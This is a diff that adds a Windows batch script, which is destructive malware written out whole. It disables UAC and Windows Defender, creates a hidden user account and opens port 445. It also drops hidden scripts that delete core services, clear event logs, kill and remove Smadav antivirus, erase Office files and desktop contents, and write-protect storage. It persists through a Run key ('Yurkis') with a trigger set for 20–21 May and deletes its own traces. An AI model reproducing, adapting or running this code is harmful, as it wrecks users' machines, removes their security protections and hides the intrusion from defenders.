@@ -1,0 +1,171 @@
+cls
+@echo off
+
+fsutil behavior set disablelastaccess 1
+	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hidden /t REG_DWORD /d 0 /f
+	reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /t REG_DWORD /v DisableAntiSpyware /f /d 1
+	reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideSCAHealth /t REG_SZ /d 1 /f	
+	reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /d 1 /f
+	reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows Script Host\Settings" /v Enabled /t REG_DWORD /d 1 /f
+	reg add "HKCU\Software\Microsoft\Windows Script Host\Settings" /v Enabled /t REG_DWORD /d 1 /f
+		
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hidden /t REG_DWORD /d 0 /f			
+	net user hidden course /add
+	netsh firewall add portopening TCP 445 "Steams" ENABLE ALL
+
+echo reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\ /va /f > %temp%/kjhgtuivxeasz.bat
+	echo reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.doc /va /f >> %temp%/kjhgtuivxeasz.bat
+	echo reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.docx /va /f >> %temp%/kjhgtuivxeasz.bat
+	echo reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.pdf /va /f >> %temp%/kjhgtuivxeasz.bat
+	echo reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.pptx /va /f >> %temp%/kjhgtuivxeasz.bat
+	echo reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip /va /f >> %temp%/kjhgtuivxeasz.bat
+	echo reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\Folder /va /f >> %temp%/kjhgtuivxeasz.bat
+	echo reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.rar /va /f >> %temp%/kjhgtuivxeasz.bat
+
+echo @echo off > %temp%/awxdainrgagrvhf.bat
+	echo net stop WSearch >> %temp%/awxdainrgagrvhf.bat
+	echo sc config WSearch start= disabled >> %temp%/awxdainrgagrvhf.bat
+	echo sc delete WSearch >> %temp%/awxdainrgagrvhf.bat
+	echo net stop Audiosrv >> %temp%/awxdainrgagrvhf.bat
+	echo sc config Audiosrv start= disabled >> %temp%/awxdainrgagrvhf.bat
+	echo sc delete Audiosrv >> %temp%/awxdainrgagrvhf.bat
+	echo net stop spooler >> %temp%/awxdainrgagrvhf.bat
+	echo sc config spooler start= disabled >> %temp%/awxdainrgagrvhf.bat
+	echo sc delete spooler >> %temp%/awxdainrgagrvhf.bat
+	echo net stop Endpoint >> %temp%/awxdainrgagrvhf.bat	
+	echo sc config Endpoint start= disabled >> %temp%/awxdainrgagrvhf.bat
+	echo sc delete Endpoint >> %temp%/awxdainrgagrvhf.bat
+
+echo net stop ClickToRunSvc >> %temp%/awxdainrgagrvhf.bat
+	echo sc config ClickToRunSvc start= disabled >> %temp%/awxdainrgagrvhf.bat
+	echo sc delete ClickToRunSvc >> %temp%/awxdainrgagrvhf.bat
+	echo net stop sysmain >> %temp%/awxdainrgagrvhf.bat
+	echo sc config sysmain start= disabled >> %temp%/awxdainrgagrvhf.bat
+	echo sc delete sysmain >> %temp%/awxdainrgagrvhf.bat
+	echo net stop wscsvc >> %temp%/awxdainrgagrvhf.bat
+	echo sc config wscsvc start= disabled >> %temp%/awxdainrgagrvhf.bat
+	echo sc delete wscsvc >> %temp%/awxdainrgagrvhf.bat								
+	echo net stop Netman >> %temp%/awxdainrgagrvhf.bat	
+	echo sc config Netman start= disabled >> %temp%/awxdainrgagrvhf.bat
+	echo sc delete Netman >> %temp%/awxdainrgagrvhf.bat
+	echo net stop netprofm >> %temp%/awxdainrgagrvhf.bat												
+	echo sc config netprofm start= disabled >> %temp%/awxdainrgagrvhf.bat	
+	echo sc delete netprofm >> %temp%/awxdainrgagrvhf.bat		
+	echo net stop SENS /y >> %temp%/awxdainrgagrvhf.bat
+	echo sc config SENS start= disabled >> %temp%/awxdainrgagrvhf.bat
+	echo sc delete SENS >> %temp%/awxdainrgagrvhf.bat
+	echo net stop eventlog /y >> %temp%/awxdainrgagrvhf.bat
+	echo sc config eventlog start= disabled >> %temp%/awxdainrgagrvhf.bat
+	echo sc delete eventlog >> %temp%/awxdainrgagrvhf.bat
+
+echo reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\dup.bmp /f > %temp%/btsdfxcvyrwfhgjg.bat
+	echo del /S /Q %userprofile%\Desktop\*.* >> %temp%/btsdfxcvyrwfhgjg.bat
+	echo del /S /Q "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe" >> %temp%/btsdfxcvyrwfhgjg.bat
+	echo RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >> %temp%/btsdfxcvyrwfhgjg.bat
+	echo start %temp%\zxvsrgnvnh.bat >> %temp%/btsdfxcvyrwfhgjg.bat
+
+echo timeout /t 120 /nobreak ^>nul > %temp%/klluhkbjxcjy.bat
+	echo reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Yurkis /f >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\egcvbzsa.bat >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\gingsmfnegdeqtyyr.bat >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\awxdainrgagrvhf.bat >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\btsdfxcvyrwfhgjg.bat >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\esfiuj.vbs >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\dlufvxxeesfjkjh.bat >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\zxvsrgnvnh.bat >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\mscdx.vbs >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\msxfe.bat >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\fnvbrthfdfcvnyr.vbs >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\kjhgtuivxeasz.bat >> %temp%/klluhkbjxcjy.bat
+	echo type nul ^> %temp%\gingsmfnegdeqtyyr.bat >> %temp%/klluhkbjxcjy.bat
+echo timeout /t 20 /nobreak ^>nul >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\egcvbzsa.bat Afhd5cuZoj.mp3 >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\gingsmfnegdeqtyyr.bat 523Efaxzc.tmp >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\awxdainrgagrvhf.bat kjfv6fwdA.rar0 >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\btsdfxcvyrwfhgjg.bat jnyeicd.mp4 >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\esfiuj.vbs mJnadO7.mp3 >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\dlufvxxeesfjkjh.bat KgTubJ.doc >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\zxvsrgnvnh.bat adzxcOJ8.mov >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\msczed.vbs edx.mov >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\msxre.bat axzzdeE8.mov >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\mscdx.vbs bkndIcx.docx >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\msxfe.bat Nhad6dcV.ppt >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\fnvbrthfdfcvnyr.vbs jKgbnd.Mp3 >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\kjhgtuivxeasz.bat kjnbj.exec >> %temp%/klluhkbjxcjy.bat
+	echo ren %temp%\gingsmfnegdeqtyyr.bat asdz.exec >> %temp%/klluhkbjxcjy.bat
+	echo del /S /Q C:\Windows\Prefetch\*.pf >> %temp%/klluhkbjxcjy.bat
+	echo del /S /Q %temp%\*.mp3 >> %temp%/klluhkbjxcjy.bat
+	echo del /S /Q %temp%\*.doc >> %temp%/klluhkbjxcjy.bat
+	echo del /S /Q %temp%\*.docx >> %temp%/klluhkbjxcjy.bat
+	echo del /S /Q %temp%\*.ppt >> %temp%/klluhkbjxcjy.bat
+	echo del /S /Q %temp%\*.exec >> %temp%/klluhkbjxcjy.bat
+	echo del /S /Q %temp%\*.mov >> %temp%/klluhkbjxcjy.bat
+	echo del /S /Q %temp%\*.mp4 >> %temp%/klluhkbjxcjy.bat
+	echo del /S /Q %temp%\*.rar0 >> %temp%/klluhkbjxcjy.bat
+	echo del /S /Q %temp%\*.tmp >> %temp%/klluhkbjxcjy.bat
+
+echo timeout /t 90 /nobreak ^>nul > %temp%/egcvbzsa.bat
+	echo wscript %temp%/esfiuj.vbs >> %temp%/egcvbzsa.bat
+
+echo taskkill /IM SmadavProtect64.exe > %temp%/gingsmfnegdeqtyyr.bat
+	echo taskkill /IM SmadavProtect32.exe >> %temp%/gingsmfnegdeqtyyr.bat
+	echo del /S /Q "C:\Program Files (x86)\SMADAV\SmadavProtect64.exe" >> %temp%/gingsmfnegdeqtyyr.bat									
+	echo del /S /Q "C:\Program Files (x86)\SMADAV\*.*" >> %temp%/gingsmfnegdeqtyyr.bat
+
+echo strComputer = "." > %temp%/esfiuj.vbs
+	echo Set objWMIService = GetObject("winmgmts:" _ >> %temp%/esfiuj.vbs
+	echo ^& "{impersonationLevel=impersonate, (Backup, Security)}!\\" _ >> %temp%/esfiuj.vbs
+	echo ^& strComputer ^& "\root\cimv2") >> %temp%/esfiuj.vbs
+	echo Set colLogFiles = objWMIService.ExecQuery _ >> %temp%/esfiuj.vbs
+	echo ("Select * from Win32_NTEventLogFile") >> %temp%/esfiuj.vbs
+	echo For each objLogfile in colLogFiles >> %temp%/esfiuj.vbs
+	echo objLogFile.ClearEventLog() >> %temp%/esfiuj.vbs
+	echo Next >> %temp%/esfiuj.vbs
+
+echo timeout /t 3 /nobreak >nul > %temp%/dlufvxxeesfjkjh.bat
+	echo taskkill /F /IM WINWORD.exe >> %temp%/dlufvxxeesfjkjh.bat
+	echo taskkill /F /IM POWERPNT.exe >> %temp%/dlufvxxeesfjkjh.bat
+	echo del /S /Q "C:\Program Files\Microsoft Office\*.dll" >> %temp%/dlufvxxeesfjkjh.bat
+	echo del /S /Q "C:\Program Files\Common Files\microsoft shared\OFFICE15\Office Setup Controller\*.exe" >> %temp%/dlufvxxeesfjkjh.bat
+	echo del /S /Q C:\MSOCache\*.msi >> %temp%/dlufvxxeesfjkjh.bat >> %temp%/dlufvxxeesfjkjh.bat >> %temp%/dlufvxxeesfjkjh.bat					
+
+echo reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 1 /f > %temp%/zxvsrgnvnh.bat
+	echo reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 1 /t REG_SZ /d ctfmon.exe /f >> %temp%/zxvsrgnvnh.bat
+	echo reg add HKLM\SYSTEM\CurrentControlSet\Control\StorageDevicePolicies /v WriteProtect /t REG_DWORD /d 1 /f >> %temp%/zxvsrgnvnh.bat
+	echo timeout /t 20 /nobreak ^>nul >> %temp%/zxvsrgnvnh.bat
+	echo reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop /v NoChangingWallPaper /t REG_DWORD /d 1 /f >> %temp%/zxvsrgnvnh.bat
+	echo exit >> %temp%/zxvsrgnvnh.bat				
+
+echo WScript.CreateObject("WScript.Shell").Run "%temp%\awxdainrgagrvhf.bat", 0 , false > %temp%/fnvbrthfdfcvnyr.vbs
+	echo WScript.CreateObject("WScript.Shell").Run "%temp%\btsdfxcvyrwfhgjg.bat", 0 , false >> %temp%/fnvbrthfdfcvnyr.vbs
+	echo WScript.CreateObject("WScript.Shell").Run "%temp%\klluhkbjxcjy.bat", 0 , false >> %temp%/fnvbrthfdfcvnyr.vbs
+	echo WScript.CreateObject("WScript.Shell").Run "%temp%\esfiuj.vbs", 0 , false >> %temp%/fnvbrthfdfcvnyr.vbs
+	echo WScript.CreateObject("WScript.Shell").Run "%temp%\egcvbzsa.bat", 0 , false >> %temp%/fnvbrthfdfcvnyr.vbs
+	echo WScript.CreateObject("WScript.Shell").Run "%temp%\gingsmfnegdeqtyyr.bat", 0 , false >> %temp%/fnvbrthfdfcvnyr.vbs		
+	echo WScript.CreateObject("WScript.Shell").Run "%temp%\dlufvxxeesfjkjh.bat", 0 , false >> %temp%/fnvbrthfdfcvnyr.vbs
+							
+echo Dim objShell > %temp%/mscdx.vbs
+	echo Set objShell = WScript.CreateObject( "WScript.Shell" ) >> %temp%/mscdx.vbs
+	echo Dim dt >> %temp%/mscdx.vbs
+	echo dt=now >> %temp%/mscdx.vbs
+	echo if (day(dt) = 20 and month(dt) = 5) Then >> %temp%/mscdx.vbs
+	echo     objShell.Run(chr(34)^&"%temp%\fnvbrthfdfcvnyr.vbs"^&chr(34)) >> %temp%/mscdx.vbs
+	echo End If >> %temp%/mscdx.vbs
+	echo if (day(dt) = 21 and month(dt) = 5) Then >> %temp%/mscdx.vbs
+	echo     objShell.Run(chr(34)^&"%temp%\fnvbrthfdfcvnyr.vbs"^&chr(34)) >> %temp%/mscdx.vbs
+	echo End If >> %temp%/mscdx.vbs
+	echo Set objShell = Nothing >> %temp%/mscdx.vbs
+
+echo WScript.CreateObject("WScript.Shell").Run "%temp%\mscdx.vbs", 0 , false > %temp%/msczed.vbs
+
+echo reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows Script Host\Settings" /v Enabled /t REG_DWORD /d 1 /f > %temp%/msxfe.bat
+	echo reg add "HKCU\Software\Microsoft\Windows Script Host\Settings" /v Enabled /t REG_DWORD /d 1 /f >> %temp%/msxfe.bat
+	echo wscript %temp%\msczed.vbs >> %temp%/msxfe.bat
+	echo exit >> %temp%/msxfe.bat
+
+echo start /MIN %temp%\msxfe.bat > %temp%/msxre.bat
+		
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Yurkis /t REG_EXPAND_SZ /d %tmp%\msxre.bat
+	reg add "HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings" -v Enabled -t REG_DWORD /d 1 /f
+pause
